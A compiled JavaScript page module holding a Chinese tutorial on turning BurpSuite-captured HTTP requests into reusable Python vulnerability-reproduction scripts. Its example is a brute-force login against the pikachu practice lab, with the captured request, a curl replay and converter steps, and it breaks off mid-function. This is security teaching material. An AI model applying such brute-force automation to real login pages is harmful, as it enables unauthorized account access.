import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as n,o as t}from"./app-CFt4SMiv.js";const e={};function l(h,s){return t(),a("div",null,s[0]||(s[0]=[n(`<h1 id="web-漏洞通用型-python-复现脚本编写指南-v1-0" tabindex="-1"><a class="header-anchor" href="#web-漏洞通用型-python-复现脚本编写指南-v1-0"><span>Web 漏洞通用型 Python 复现脚本编写指南 V1.0</span></a></h1><h2 id="前言" tabindex="-1"><a class="header-anchor" href="#前言"><span>前言</span></a></h2><p>在复现 Web 漏洞的过程中通常会发 HTTP 请求来进行攻击, 这个操作是可以用 Python 的 requests, urllib, aiohttp, httpx 等网络请求库实现的(在此项指南中以 requests 库为例)</p><p>因此如果需要重复复现漏洞或是批量复现漏洞的话, 那么编写通用脚本, 之后需要的时候只需要跑脚本即可验证复现情况</p><p>此项指南旨在为上述过程的快速实现做一个常规的梳理, 希望能够帮助到有相关需求的同学</p><hr><h2 id="应用场景" tabindex="-1"><a class="header-anchor" href="#应用场景"><span>应用场景</span></a></h2><p>对于攻击方可以通过发 HTTP 请求进行复现的 Web 漏洞</p><p>可以通过编写 Python 脚本发 HTTP 请求实现浮现措施的归档以及复用或者进一步集成到大的自动化复现项目中</p><blockquote><p>PS: 对于 XSS 钓鱼攻击, CSRF 等针对用户的攻击, 不方便使用此种方式进行复现</p></blockquote><hr><h2 id="环境准备" tabindex="-1"><a class="header-anchor" href="#环境准备"><span>环境准备</span></a></h2><h3 id="brupsuit" tabindex="-1"><a class="header-anchor" href="#brupsuit"><span>BrupSuit</span></a></h3><p>BurpSuite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对web应用的渗透测试和攻击。在渗透测试中，我们使用Burp Suite将使得测试工作变得更加容易和方便，即使在不需要娴熟的技巧的情况下，只有我们熟悉Burp Suite的使用，也使得渗透测试工作变得轻松和高效。</p><p>在本指南中主要会使用 BurpSuit 的 Proxy 功能拦截网络请求, 使用其 Community 版本即可</p><p>可在 <a href="https://portswigger.net/burp/releases/professional-community-2022-9-6?requestededition=community&amp;requestedplatform=" target="_blank" rel="noopener noreferrer">Professional / Community 2022.9.6 | Releases (portswigger.net)</a> 获取相应系统版本的 BurpSuit 安装包</p><blockquote><p>个人对 BurpSuit 使用的随笔可参阅 <a href="https://ayusummer.github.io/DailyNotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/BurpSuite.html" target="_blank" rel="noopener noreferrer">BurpSuit | DailyNotes (ayusummer.github.io)</a></p></blockquote><blockquote><p>Community 版本不支持保存项目也是当有重复复现需求时不使用 Burp 而是编写自动化验证脚本的原因之一</p></blockquote><hr><h3 id="python" tabindex="-1"><a class="header-anchor" href="#python"><span>Python</span></a></h3><blockquote><p>可在 <a href="https://www.python.org/downloads/" target="_blank" rel="noopener noreferrer">Download Python | Python.org</a> 获取相应系统版本的 Python 安装包</p><hr></blockquote><p>个人平时使用的是 Python 3.8 及以上的版本, 只是写写脚本不需要像大型项目一样考虑适配等复杂问题的时候个人比较倾向于更新的版本</p><blockquote><p>不推荐使用 Python 2, Python 2 到 Python 3 的语法是不一样的, 很多库也无法适配</p></blockquote><hr><p>安装完 Python 之后可以考虑先换个源然后装下 <code>requests</code> 库</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 将 pip 默认源更改为清华源</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> global.index-url</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> https://pypi.tuna.tsinghua.edu.cn/simple/</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 看下是否生效</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> list</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 安装 requests 库</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> requests</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>换源是因为默认源在中国大陆访问速度会比较慢, 这时使用国内的源会比较好</p><p>如果在 VSCode 中的终端中运行安装库的命令出现类似于如下报错</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ERROR: Could not install packages due to an Environment: [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">WinError</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] 系统找不到指定的文件 : xxxxxxxxx </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt; xxxxx\\\\pythonxx\\\\Scripts\\\\</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">xxx.exe</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.deleteme</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>那么就是权限问题, 请使用管理员方式打开 VSCode</p></blockquote><blockquote><p>更多 Python 开发环境配置相关的内容可参阅 <a href="https://ayusummer.github.io/DailyNotes/Language/Python/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83.html" target="_blank" rel="noopener noreferrer">安装 Python | DailyNotes (ayusummer.github.io)</a></p></blockquote><hr><h3 id="vscode" tabindex="-1"><a class="header-anchor" href="#vscode"><span>VSCode</span></a></h3><p>个人平时比较倾向于使用 VSCode 连接远程 Linux 系统以及编写 Python 工具或是开发前端项目, 在本指南中主要会用到 VSCode 中的 <code>RESTClinet</code>, <code>Thunder Client</code>, <code>Python</code> 扩展</p><hr><p><a href="https://code.visualstudio.com/Download" target="_blank" rel="noopener noreferrer">官网下载 VSCode</a> 速度比较慢, 可以在下载时将直链替换国内镜像地址, 以达到更快的下载速度.</p><p>在下载按钮上右键复制链接, 或者点击下载后在浏览器下载或者是其他下载工具中可以找到软件下载的直链</p><p><img src="http://cdn.ayusummer233.top/img/20211119092740.png" alt="20211119092740"></p><p>复制该 URL 然后将 <code>/stable</code> 前的地址替换为国内镜像地址再进行下载即可, 如:</p><ul><li><p>原地址: <code>https://az764295.vo.msecnd.net/stable/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/VSCodeUserSetup-x64-1.62.3.exe</code></p><p>将 <code>az764295.vo.msecnd.net</code> 替换为 <code>vscode.cdn.azure.cn</code> 得到新地址:</p><p>新地址: <code>https://vscode.cdn.azure.cn/stable/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/VSCodeUserSetup-x64-1.62.3.exe</code></p><p>然后通过这个新地址下载即可</p></li></ul><hr><p>安装完 VSCode 之后可以新建一个文件夹或者打开要放置 Python 脚本的文件目录, 然后安装 <code>Thunder Client</code> 以及 <code>REST Client</code> 扩展</p><p><img src="http://cdn.ayusummer233.top/img/202211121845838.png" alt="image-20221112184548800"></p><p><img src="http://cdn.ayusummer233.top/img/202211121855782.png" alt="image-20221112185527753"></p><blockquote><p>VSCode 本身是比较轻量的, 基本上可以秒开, 因此如果电脑性能比较吃紧的话 VSCode 会是一个比较优秀的代码编辑器</p><p>不过 VSCode 有着强大的扩展商店, 如果安装了数量繁多的插件并且全局启用了他们, 那么想要流畅的打开 VSCode 可能也不是很容易</p><p>因此这里推荐对工作区(当前打开的文件目录或者是设置的VSCode工作区) 启用其需要的扩展来使得 VSCode 在打开相应的工作区时只加载本工作区中启用的扩展, 这样可以提高 VSCode 打开与运行的流畅度</p><p>安装扩展时默认是全局安装的, 因此安装完后可以先点击禁用按钮, 然后点击启用按钮的下拉菜单, 选择在 <code>启用(工作区)</code> 来在当前工作区启用该扩展</p><blockquote><p>Jetbrains 家的软件, 比如 IDEA, Pycharm 等 IDE 在对口的项目中的使用体验会比较好, 不过当内存及硬盘不太好时单单是启动后的建立 Index 的步骤就会花费不少时间</p></blockquote><p>需要汉化页面的话可以安装此扩展</p><p><img src="http://cdn.ayusummer233.top/img/202211121854691.png" alt="image-20221112185436630"></p></blockquote><p>在本教程的后续内容中将</p><ul><li>使用 REST Client 发送 BurpSuit 抓取的 HTTP 请求(以及拷贝 curl 命令并导入到 Thunder Client)</li><li>使用 Thunder Client (类似于使用 Postman)发送 HTTP 请求以及生成可供参考的其他语言的 HTTP 请求代码</li></ul><hr><h2 id="演示实例-以-pikachu-靶场基于表单的暴力破解为例" tabindex="-1"><a class="header-anchor" href="#演示实例-以-pikachu-靶场基于表单的暴力破解为例"><span>演示实例 - 以 pikachu 靶场基于表单的暴力破解为例</span></a></h2><hr><h3 id="手工复现漏洞并使用-burpsuit-拦截请求" tabindex="-1"><a class="header-anchor" href="#手工复现漏洞并使用-burpsuit-拦截请求"><span>手工复现漏洞并使用 BurpSuit 拦截请求</span></a></h3><p>打开 BurpSuit 的 Proxy 页面, 点击 <code>Open Browser</code> 按钮, BurpSuit 将会打开一个自带的 Chome 浏览器</p><p><img src="http://cdn.ayusummer233.top/img/202211121907549.png" alt="image-20221112190754507"></p><p><img src="http://cdn.ayusummer233.top/img/202211121907701.png" alt="image-20221112190634916"></p><p>访问 pikachu 靶场的 <code>基于表单的暴力破解</code> 页面</p><p><img src="http://cdn.ayusummer233.top/img/202211121908032.png" alt="image-20221112190827009"></p><p>在本题漏洞的复现中, 将会暴力破解一个没有额外限制的登录接口, 手工输入几次账密看看效果</p><p>在尝试了多次手动登录观察了返回信息后大概了解该自动化该流程的思路了</p><p><img src="http://cdn.ayusummer233.top/img/202211121912483.png" alt="image-20221112191214460"></p><p>那么此时打开 BurpSuit 的 Proxy 页面的 <code>intercept is off</code> 按钮将其切换为 <code>intercept is on</code> 的状态, 开始拦截登录请求</p><p><img src="http://cdn.ayusummer233.top/img/202211121913363.png" alt="image-20221112191311345"></p><p>开启 <code>Intercept</code> 后再在 pikachu 靶场的 <code>基于表单的暴力破解</code> 页面登录一次可以看到左上角页面在加载</p><p><img src="http://cdn.ayusummer233.top/img/202211121914485.png" alt="image-20221112191445465"></p><p>此时 BurpSuit 已经拦截到了此次请求</p><p><img src="http://cdn.ayusummer233.top/img/202211121917161.png" alt="image-20221112191516096"></p><p>该页面中的数据可以修改(也就是常说的用 Burp 改包), 之后可以</p><ul><li><p>点击 <code>Forward</code> 按钮, 继续发送 (已修改过) 的请求, 此时浏览器将继续发送 (在 Burp 中修改过的) 请求</p><p><img src="http://cdn.ayusummer233.top/img/202211121917721.png" alt="image-20221112191731693"></p></li><li><p>将通过 <code>在编辑区域右键 / 点击 Action 按钮 / 编辑区域右上角的三横线菜单 -&gt; Send to Repeater</code> 将请求发送到 <code>Repeater</code> 来重复 (修改并) 发送登录请求</p><p><img src="http://cdn.ayusummer233.top/img/202211121919666.png" alt="image-20221112191958641"></p><p>之后就可以在 Repeater 页面看到刚才的请求了</p><p><img src="http://cdn.ayusummer233.top/img/202211121921177.png" alt="image-20221112192141148"></p><p>可以在此处修改并点击编辑区域左上角的 <code>Send</code> 按钮发送 (修改后) 的请求</p><p>然后就可以在 <code>Response</code> 区域看到返回的响应内容了</p><p><img src="http://cdn.ayusummer233.top/img/202211121924085.png" alt="image-20221112192416040"></p><p>之后还可以使用 BurpSuit 的 Intruder 模块来进行自动化的暴力破解操作, 但是这里就不在赘述了</p><ul><li><p>一方面是因为本指南意不在此</p></li><li><p>另一方面是 Community 版本的爆破速度太慢了</p><blockquote><p>几个小时才能发送几百条的水平</p></blockquote></li></ul></li></ul><hr><h3 id="将-http-请求保存下来并使用-rest-clinet-发送并拷贝-linux-curl-命令" tabindex="-1"><a class="header-anchor" href="#将-http-请求保存下来并使用-rest-clinet-发送并拷贝-linux-curl-命令"><span>将 HTTP 请求保存下来并使用 REST Clinet 发送并拷贝 Linux curl 命令</span></a></h3><p>复制 BurpSuit Proxy 页面拦截到的登录请求信息, 也即</p><div class="language-http line-numbers-mode" data-highlighter="shiki" data-ext="http" data-title="http" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">POST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /vul/burteforce/bf_form.php </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">HTTP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1.1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Host</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 192.168.2.31:9221</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Content-Length</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 45</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Cache-Control</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> max-age=0</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Upgrade-Insecure-Requests</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Origin</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://192.168.2.31:9221</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Content-Type</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> application/x-www-form-urlencoded</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">User-Agent</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Accept</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Referer</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://192.168.2.31:9221/vul/burteforce/bf_form.php</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Accept-Encoding</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> gzip, deflate</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Accept-Language</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> zh-CN,zh;q=0.9</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Cookie</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PHPSESSID=4v6itaf5q06hhm24uiuvmdps67</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Connection</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> close</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username=admin&amp;password=password&amp;submit=Login</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 VSCode 打开的存放 Python 脚本并启用了 <code>REST Client</code> 和 <code>Thunder Client</code> 的工作区中新建一个文件并粘贴刚才复制的 HTTP 请求, 然后会在内容左上方看到一个 <code>Send Request</code> 按钮, 点击后即可在右侧 <code>Response</code> 区域看到响应结果</p><blockquote><p>文件名和后缀都不重要, 有辨识度即可</p></blockquote><p><img src="http://cdn.ayusummer233.top/img/202211121933661.png" alt="image-20221112193346625"></p><blockquote><p>这样就实现了把关键请求保存下来而不用使用 Professional 的 BurpSuit 保存工作区的功能</p><p>或者在 BurpSuit 中保存请求到文件</p><p><img src="http://cdn.ayusummer233.top/img/202211121955285.png" alt="image-20221112195503258"></p><p>一层层选目录不如直接复制文本</p><p><img src="http://cdn.ayusummer233.top/img/202211121955556.png" alt="image-20221112195554533"></p><p>存到文件里要用的话也还是要复制拷贝到 BurpSuit 用, 反而不如直接拿 REST Client 发送</p><hr></blockquote><p>在编辑区域右键, 点击 <code>Copy Request As CURL</code> 按钮即可复制该请求对应的 Linux Curl 命令</p><p><img src="http://cdn.ayusummer233.top/img/202211121937514.png" alt="image-20221112193709483"></p><blockquote><p>虽然在 BurpSuit 中也有拷贝 curl 命令</p><p><img src="http://cdn.ayusummer233.top/img/202211121957398.png" alt="image-20221112195708342"></p><p>但是拷贝的 curl 执行后无法获得登录请求的响应内容而是一些请求的基本信息</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -i</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -s</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -k</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -X</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;POST&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">    -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Host: 192.168.2.31:9221&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Content-Length: 45&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Cache-Control: max-age=0&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Upgrade-Insecure-Requests: 1&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Origin: http://192.168.2.31:9221&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Referer: http://192.168.2.31:9221/vul/burteforce/bf_form.php&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Accept-Encoding: gzip, deflate&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Accept-Language: zh-CN,zh;q=0.9&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;Connection: close&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">    -b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;PHPSESSID=4v6itaf5q06hhm24uiuvmdps67&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">    --data-binary</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> $&#39;username=admin&amp;password=password&amp;submit=Login&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    $&#39;http://192.168.2.31:9221/vul/burteforce/bf_form.php&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/img/202211122006546.png" alt="image-20221112200609522"></p></blockquote><hr><h3 id="根据-curl-命令生成对应的可供参考的-python-代码" tabindex="-1"><a class="header-anchor" href="#根据-curl-命令生成对应的可供参考的-python-代码"><span>根据 curl 命令生成对应的可供参考的 Python 代码</span></a></h3><h4 id="使用-thunder-clinet" tabindex="-1"><a class="header-anchor" href="#使用-thunder-clinet"><span>使用 Thunder Clinet</span></a></h4><p>复制利用 REST Client 生成的登录请求对应的 curl 命令并导入到 Thunder Client 中</p><p><img src="http://cdn.ayusummer233.top/img/202211122009942.png" alt="image-20221112200923918"></p><p><img src="http://cdn.ayusummer233.top/img/202211122010952.png" alt="image-20221112201046896"></p><p>可以看到请求导入到 Thunder Client 后会生成类似于使用 Postman 发请求的页面并自动发出该请求</p><p>可以看到的是该次请求并没能获得想要的关键信息</p><p>这<mark>可能</mark>是因为 <code>Thunder Clinet</code> 对于 <mark><code>application/x-www-form-urlencoded</code></mark> 形式的参数解析有问题, 没能解析出对应的 body</p><p><img src="http://cdn.ayusummer233.top/img/202211122015364.png" alt="image-20221112201514340"></p><p>需要手动在 Body 页面中添加下参数, 具体参考 HTTP 请求的如下部分:</p><div class="language-http line-numbers-mode" data-highlighter="shiki" data-ext="http" data-title="http" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username=admin&amp;password=password&amp;submit=Login</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/img/202211122017802.png" alt="image-20221112201727768"></p><p>可以看到此次请求获取到了关键信息</p></blockquote><p>然后可以在 Response 区域点击 <code>Code Snippet</code> 按钮选择 Python 语言并使用 Requests 库生成对应的 Python 代码</p><p><img src="http://cdn.ayusummer233.top/img/202211122020222.png" alt="image-20221112202008193"></p><p>新建一个 <code>py</code> 文件并粘贴该代码, 然后运行</p><p><img src="http://cdn.ayusummer233.top/img/202211122037342.png" alt="image-20221112203654413"></p><p>这样在请求中就可以找到相应的关键信息了</p><p><img src="http://cdn.ayusummer233.top/img/202211122037975.png" alt="image-20221112203743948"></p><hr><h4 id="使用-curlconverter" tabindex="-1"><a class="header-anchor" href="#使用-curlconverter"><span>使用 <code>curlconverter</code></span></a></h4><p>在 VSCode 中安装 <code>curlconverter</code> 扩展</p><p><img src="http://cdn.ayusummer233.top/img/202211122018135.png" alt="image-20221112201833112"></p><p>利用 REST Client 复制 HTTP 请求为 cURL 命令到剪贴板, 新建一个 py 文件并打开, 在编辑区域右键并选择 <code>Paste cURL As Python</code></p><p><img src="http://cdn.ayusummer233.top/img/202211122043048.png" alt="image-20221112204353006"></p><p><img src="http://cdn.ayusummer233.top/img/202211122046890.png" alt="image-20221112204657852"></p><p>可以在最后一行添加一行输出语句以在终端中查看结果</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(response.text)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>在终端中运行该 py 文件</p><p><img src="http://cdn.ayusummer233.top/img/202211122051344.png" alt="image-20221112205134317"></p><hr><p>受限于 VSCode, curlconverter 扩展的版本会比其 web 端旧很多, 因此也可以在<a href="https://curlconverter.com/" target="_blank" rel="noopener noreferrer">其 Web 端 - Convert curl commands to code (curlconverter.com)</a> 来利用 cURL 命令生成对应的 Python 代码</p><p><img src="http://cdn.ayusummer233.top/img/202211122054593.png" alt="image-20221112205413529"></p><hr><p><mark>至此我们就利用 BurpSuit 拦截的登录请求生成了一个基本的 Python 请求代码, 那么下面就是根据此代码进行相应的处理来实现实际的复现需求</mark></p><hr><h3 id="编写复现脚本" tabindex="-1"><a class="header-anchor" href="#编写复现脚本"><span>编写复现脚本</span></a></h3><h4 id="提取关键信息" tabindex="-1"><a class="header-anchor" href="#提取关键信息"><span>提取关键信息</span></a></h4><p>通常情况下我们并不需要完整的响应信息, 而是只需要其中的某些关键信息, 比如本例中的 <code>&lt;p&gt; username or password is not exists～&lt;/p&gt;</code></p><p>对于文本的匹配可能首先会想到正则, 不过这种没有明确规律的文本用正则匹配的话也是限定前后缀取中间部分的内容, 因此可以直接使用 <code>str.find</code> 来匹配前后缀获取内容</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> match_fix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> prefix</span><span 